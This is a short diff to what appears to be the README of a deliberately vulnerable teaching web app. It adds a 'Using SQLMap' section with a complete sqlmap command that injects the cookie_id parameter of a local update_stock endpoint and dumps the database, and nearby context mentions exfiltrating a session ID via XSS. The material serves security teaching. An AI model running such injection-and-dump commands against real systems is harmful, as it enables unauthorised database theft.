@@ -87,3 +87,7 @@ Look in the F12 console to see the session ID being exfiltrated via the Network 
 
 
 **Note:** This is for educational purposes only. Do not use SQL injection or XSS in real applications.
+
+## Using SQLMap
+
+   sqlmap -u "http://localhost:5000/update_stock" --data "cookie_id=1&new_stock=1" -p "cookie_id" --method POST --dump --batch
